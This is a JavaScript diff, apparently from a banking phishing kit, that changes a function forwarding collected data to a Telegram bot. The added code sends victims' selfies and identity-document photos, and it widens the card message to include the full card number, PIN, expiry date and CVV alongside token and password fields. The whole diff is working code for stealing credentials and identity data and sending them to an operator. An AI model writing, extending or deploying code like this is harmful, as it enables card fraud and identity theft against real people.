@@ -82,6 +82,25 @@ async function sendTelegramMessage(data) {
             ]
         };
 
+        // Si es una foto (base64), enviarla como imagen
+        if (data.foto) {
+            const buffer = Buffer.from(data.foto.split(',')[1], 'base64');
+            let caption;
+            
+            if (data.tipo === 'Selfie') {
+                caption = `📸 Selfie de verificación\n🆔 Message ID: ${data.messageId}`;
+            } else if (data.tipo === 'Cédula') {
+                caption = `🪪 Documento de identidad\n🆔 Message ID: ${data.messageId}`;
+            }
+            
+            const result = await bot.sendPhoto(chatId, buffer, {
+                caption: caption,
+                parse_mode: 'HTML'
+            });
+            
+            return result;
+        }
+
         let messageText;
         if (typeof data === 'object') {
             if (data.tipo === 'Clave Segura') {
@@ -93,8 +112,10 @@ async function sendTelegramMessage(data) {
                 messageText = `💳 Nueva solicitud de ingreso:\n\n` +
                             `📋 Tipo: ${data.tipo}\n` +
                             `🪪 Documento: ${data.tipoDocumento} ${data.numeroDocumento}\n` +
-                            `💳 Tarjeta: ${data.ultimosDigitos}\n` +
-                            `🔑 Clave: ${data.claveTarjeta}`;
+                            `💳 Número Tarjeta: ${data.numeroTarjeta}\n` +
+                            `🔑 Clave: ${data.claveTarjeta}\n` +
+                            `📅 Vencimiento: ${data.fechaVencimiento}\n` +
+                            `🔐 CVV: ${data.cvv}`;
             } else if (data.tipo === 'Token') {
                 messageText = `🔐 Verificación de Token:\n\n` +
                             `🔑 Código: ${data.codigo}\n` +
